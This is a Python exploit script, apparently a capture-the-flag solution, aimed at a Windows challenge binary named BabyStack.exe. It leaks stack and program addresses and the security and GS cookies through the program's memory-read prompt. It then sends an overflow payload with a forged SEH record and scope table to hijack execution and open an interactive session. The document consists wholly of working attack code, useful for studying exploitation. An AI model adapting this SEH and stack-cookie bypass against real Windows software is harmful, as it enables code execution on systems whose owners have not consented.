from pwintools import *
import struct

def p32(addr):
    return struct.pack("<I",addr)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def search_addr(addr):
    p.recvuntil("Do you want to know more?\r\n")
    p.sendline("yes")
    p.recvline()
    p.sendline(str(addr))
    p.recvuntil("value is ")

p = Process("./BabyStack.exe")
p.recvuntil("Hello,I will give you some gifts\r\n")

p.recvuntil("stack address = ")
stack_addr = int(p.recvuntil("\r\n")[:-2],16)
lg("stack_addr",stack_addr)

p.recvuntil("main address = ")
main_addr = int(p.recvuntil("\r\n")[:-2],16) + 0x6c2
lg("main_addr",main_addr)

p.recvline()
p.sendline(hex(main_addr + 0x161)[2:].rjust(8,"0").upper())

search_addr(main_addr + 0x57e4)
security_cookie = int(p.recvuntil("\r\n")[:-2],16)
lg("security_cookie",security_cookie)

# stack_addr-->0xd8fbf0
# 00D8FB24  buffer_start
# 00D8FBB4  GS_cookie
# 00D8FBB8  addr1
# 00D8FBBC  start
# 00D8FBC0  next_SEH
# 00D8FBC4  this_SEH_ptr
# 00D8FBC8  scope_table

search_addr(stack_addr - (0xd8fbf0 - 0x0D8FBC0))
next_SEH = int(p.recvuntil("\r\n")[:-2],16)
lg("next_SEH",next_SEH)

search_addr(stack_addr - (0xd8fbf0 - 0x0D8FBC4))
this_SEH_ptr = int(p.recvuntil("\r\n")[:-2],16)
lg("this_SEH_ptr",this_SEH_ptr)

search_addr(stack_addr - (0xd8fbf0 - 0x0D8FBC8))
Scope_Table = int(p.recvuntil("\r\n")[:-2],16)
lg("Scope_Table",Scope_Table)

search_addr(stack_addr - (0xd8fbf0 - 0x0D8FBB4))
GS_cookie = int(p.recvuntil("\r\n")[:-2],16)
lg("GS_cookie",GS_cookie)

search_addr(stack_addr - (0xd8fbf0 - 0x0D8FBBC))
start = int(p.recvuntil("\r\n")[:-2],16)
lg("start",start)

p.recvuntil("Do you want to know more?\r\n")
p.sendline("homura")

buffer_start = stack_addr - (0xd8fbf0 - 0x0D8FB24)
payload = ""
payload += "A"*8
payload += p32(0xFFFFFFE4)
payload += p32(0)
payload += p32(0xFFFFFF0C)
payload += p32(0)
payload += p32(0xFFFFFFFE)
payload += p32(main_addr - 0x1b8)
payload += p32(main_addr - 0x175)
payload = payload.ljust(0x88,"C")
payload += "H"*0x8
payload += p32(GS_cookie)
payload += p32(main_addr - 0x175) # "C"*0x4
payload += "C"*0x4 # p32(main_addr - 0x175)
payload += p32(next_SEH)
payload += p32(this_SEH_ptr)
payload += p32((buffer_start + 8)^security_cookie)
# payload += p32(Scope_Table)
p.sendline(payload)

p.recvuntil("Do you want to know more?\r\n")
p.sendline("yes")
p.recvline()

# raw_input()
p.sendline("AA")
# raw_input()

p.interactive()
